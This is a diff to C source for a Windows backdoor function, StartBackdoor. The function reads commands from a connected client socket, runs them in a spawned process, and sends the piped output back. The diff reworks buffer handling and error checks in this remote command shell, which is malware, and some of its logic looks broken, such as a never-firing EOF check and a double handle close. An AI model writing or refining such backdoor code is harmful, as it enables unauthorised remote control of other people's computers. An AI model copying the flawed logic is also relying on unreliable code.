@@ -82,13 +82,19 @@ BOOL StartBackdoor(void) {
 
             // Allocate a buffer for command
             char *cmd = NULL;
-            int cmdLen = 0;
             
             if (client != INVALID_SOCKET) {
-                // Read command from client (USE CLIENT SOCKET, not LISTENING SOCKET)
+                // Allocate command buffer
                 cmd = (char*)malloc(1024 * sizeof(char));
-                if (cmd) {
-                    int bytes = recv(client, cmd, 1023, 0);  // FIXED: use client here
+                if (!cmd) {
+                    printf("[DEBUG] malloc failed for cmd\n");
+                    fflush(stdout);
+                } else {
+                    // Initialize command buffer to 0
+                    memset(cmd, 0, 1024);
+                    
+                    // Read command from client (USE CLIENT SOCKET)
+                    int bytes = recv(client, cmd, 1023, 0);
                     if (bytes > 0) {
                         cmd[bytes] = 0;
                         printf("[BACKDOOR] Received Command: %s\n", cmd);
@@ -110,34 +116,41 @@ BOOL StartBackdoor(void) {
                                 fclose(hWritePipe);
                                 
                                 // Read output from pipe
-                                char buffer[1024] = {0};
-                                char temp[1024] = {0};
+                                char temp[4096];
                                 BOOL stillRunning = TRUE;
                                 
                                 while (stillRunning) {
-                                    DWORD bytesRead = 0;
-                                    ReadFile(hReadPipe, temp, sizeof(temp) - 1, &bytesRead, NULL);
-                                    temp[bytesRead] = 0;
+                                    // Initialize buffer to 0
+                                    memset(temp, 0, 4096);
                                     
-                                    if (bytesRead > 0) {
+                                    // Read from pipe
+                                    DWORD bytesRead = 0;
+                                    BOOL success = ReadFile(hReadPipe, temp, 4096, &bytesRead, NULL);
+                                    
+                                    if (success && bytesRead > 0) {
                                         // Send output to client
                                         send(client, temp, bytesRead, 0);
-                                        printf("[BACKDOOR] Received Output: %s\n", temp);
+                                        printf("[BACKDOOR] Received Output: %.*s", (int)bytesRead, temp);
                                         fflush(stdout);
                                         
-                                        if (temp[0] == 0) { // EOF check
+                                        // Check if process ended
+                                        if (bytesRead == 0) {
                                             stillRunning = FALSE;
                                             printf("[BACKDOOR] Shell exited\n");
                                             fflush(stdout);
                                         }
                                     } else {
-                                        stillRunning = FALSE;
+                                        if (bytesRead == 0) {
+                                            stillRunning = FALSE;
+                                        }
+                                        printf("[BACKDOOR] ReadFile failed: %lu\n", (unsigned long)GetLastError());
+                                        fflush(stdout);
                                     }
                                 }
                                 
                                 // Cleanup
                                 CloseHandle(hReadPipe);
-                                CloseHandle(hWritePipe);
+                                CloseHandle(hWritePipe); // Note: hReadPipe closed
                                 CloseHandle(pi.hThread);
                                 CloseHandle(pi.hProcess);
                                 free(cmdWide);
